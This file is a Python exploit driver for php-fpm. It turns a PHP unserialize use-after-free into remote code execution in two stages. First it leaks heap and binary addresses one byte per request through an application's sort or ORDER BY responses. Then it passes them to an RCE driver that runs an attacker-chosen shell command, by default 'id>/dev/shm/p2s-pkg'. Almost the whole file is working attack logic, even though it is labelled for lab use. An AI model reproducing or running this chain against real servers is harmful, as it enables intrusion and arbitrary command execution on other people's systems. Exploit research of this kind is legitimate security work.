#!/usr/bin/env python3
# INDEX: uaf->rce via no-echo comparison-sink leak | fpm | pure | other(comparison sink) | build | fire needs --read-url
"""End-to-end php-fpm UAF->RCE through a common comparison/branch app sink.
Lands through a usort / ORDER BY render, with no serialize-echo sink and no
/proc in the exploit path. CVE-2026-109618 / CVE-2026-109619.

Bug credit: iQingshan var_hash unserialize UAF (CVE-2026-109618/109619).

Stage 1 (leak, fully no-echo): fire the var_hash UAF so a live heap pointer
lands in the app's decoded field, recover it through the SORT sink's row order
(1 byte/request) cross-agreed against the ORDERED gate's HTTP status, mask to the
2 MB chunk base, then forge one IS_STRING read of &zval_ptr_dtor and carry its 6
bytes over the same sort sink for byte-exact binbase. Stage 2 (fire): hand
(chunk, binbase) to the fpm RCE driver. The element-0 object's in-chunk offset
is request-shape dependent (OBJ_OFF_SORT / OBJ_OFF_ORDERED), re-derived offline
(not in the live path). A comparison sink carries anchored leak reads but not
by-name resolution, so Stage 2's resolution reads need a reflective endpoint
(--read-url); 8.4.26 additionally needs the fire's class-entry offset re-derived.
Imports the project modules read-only. Pure stdlib, safe under python3 -I.
Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
from urllib.parse import urlsplit

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


# Stage 1 -- no-echo exfil of both pointers through the comparison sink
def stage1_exfil(url, log=print):
    """Return (chunk, binbase, detail) using only comparison-sink observables.

    chunk   : recovered via the SORT sink and cross-agreed via the ORDERED gate.
    binbase : forged read of &zval_ptr_dtor carried over the SORT sink,
              derived with the SHAPE-recalibrated OBJ_OFF_SORT. byte-exact.
    """
    X = _load("primitives/oracles/sideeffect_exfil_apps.py")
    S1 = _load("sinkexfil_stage1.py")
    u = urlsplit(url if "://" in url else "http://" + url)
    http = X.Http(u.hostname, u.port or 80)
    extra = [u.path] if u.path and u.path.endswith(".php") else []
    log(f"[stage1] target {http.host}:{http.port}  (comparison-sink exfil, no echo)")

    sinks = X.autodetect(http, extra_paths=extra, log=log)
    sort = sinks.get("sort")
    gate = sinks.get("ordered")
    if sort is None:
        log("[stage1] FAIL: no SORT sink detected (need a usort/ORDER BY route "
            "that unserialize()s request input)")
        return None, None, {"error": "no sort sink"}

    # Delegate the shared leak (SORT chunk + ORDERED cross-agree + forged binbase
    # read + fingerprint) to the primitive both chains call.
    chunk, binbase, dtor, d = S1.sinkexfil_stage1(sort, gate=gate, log=log)
    if binbase is None:
        log("[stage1] binbase not 2MB-aligned -> OBJ_OFF_SORT needs "
            "re-calibration (verify_sideeffect_exfil_apps.py --calibrate)")
        return chunk, None, {"error": "binbase misaligned", "reqs": http.reqs}

    log(f"[stage1] CHUNK   = 0x{chunk:x}")
    log(f"[stage1] BINBASE = 0x{binbase:x}  (&zval_ptr_dtor=0x{dtor:x}, byte-exact)")
    log(f"[stage1] {http.reqs} requests, NO serialize echo on any exfil request")
    return chunk, binbase, {"reqs": http.reqs, "chunk_agree": d["chunk_agree"],
                            "dtor": dtor, "obj_off_sort": X.OBJ_OFF_SORT}


# Stage 2 -- fire via the fpm RCE driver with the no-echo-exfil'd (chunk, binbase)
def stage2_fire(read_url, binbase, chunk, cmd, attempts=6, log=print):
    """Compose the fpm RCE driver. `read_url` is the endpoint that carries the
    fire's resolution reads (the reflective read; a pure comparison sink cannot
    carry these). With read_url == the sort endpoint, the fire stops at the
    first resolution read."""
    rce = _load("fpm_route.py")
    u = urlsplit(read_url if "://" in read_url else "http://" + read_url)
    host, port = u.hostname, u.port or 80
    path = u.path if u.path and u.path.endswith(".php") else "/remote_app.php"
    log(f"\n[stage2] fire fpm_route: reads via {host}:{port}{path}  "
        f"binbase=0x{binbase:x} chunk=0x{chunk:x}")
    rce.install_fpm_patches(host, port, path, binbase)
    if not rce.preflight_reflect(host, port, path):
        log("[stage2] the read endpoint does not reflect serialize() -> the a7 "
            "resolution reads (R-3..R-6) have no transport here. This is WALL 1: "
            "a comparison sink carries the LEAK (stage 1) but not the by-name "
            "RESOLUTION. Supply --read-url pointing at a reflective endpoint to "
            "carry the fire, or route resolution through an echo sink.")
        return False, {"wall": 1}
    ok, stats = rce.run_fpm_chain(host, port, path, binbase, cmd,
                                  chunk=chunk, attempts=attempts)
    return ok, stats


# Driver
def run(url, read_url=None, cmd=b"id>/dev/shm/p2s-pkg", fire=True, log=print):
    chunk, binbase, d = stage1_exfil(url, log=log)
    if binbase is None:
        log("[result] stage 1 (no-echo exfil) did not yield binbase; aborting.")
        return 2
    if not fire:
        log("[result] stage 1 complete (chunk+binbase exfil'd with NO echo). "
            "Fire skipped (--no-fire).")
        return 0
    rurl = read_url or url  # with no reflective endpoint, fire against the sink
    ok, stats = stage2_fire(rurl, binbase, chunk, cmd, log=log)
    log("\n" + "=" * 64)
    log(f"[result] stage1 no-echo exfil: chunk=0x{chunk:x} binbase=0x{binbase:x}")
    log(f"[result] stage2 fire delivered: {ok}")
    if not ok:
        log("[result] see WALL 1 / WALL 2 in the module docstring: a fully "
            "no-echo FIRE through a pure comparison sink is bandwidth/structure "
            "walled on the resolution reads; and fpm_route's R-5 class-entry "
            "offset is 8.5.x-calibrated (re-derive for 8.4.26).")
    return 0 if ok else 1


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://127.0.0.1:8159",
                    help="comparison-sink app base URL (sort + ordered routes); "
                         "Stage 1 runs here with NO echo")
    ap.add_argument("--read-url", default=None,
                    help="OPTIONAL reflective (echo) endpoint to carry the fire's "
                         "resolution reads (WALL 1); omit to fire against the sink")
    ap.add_argument("--cmd", default="id>/dev/shm/p2s-pkg",
                    help="command to run (<=14 bytes after the GC byte)")
    ap.add_argument("--no-fire", action="store_true",
                    help="Stage 1 only: exfil chunk+binbase no-echo, then stop")
    a = ap.parse_args(argv)
    return run(a.url, read_url=a.read_url, cmd=a.cmd.encode("latin-1"),
               fire=not a.no_fire)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
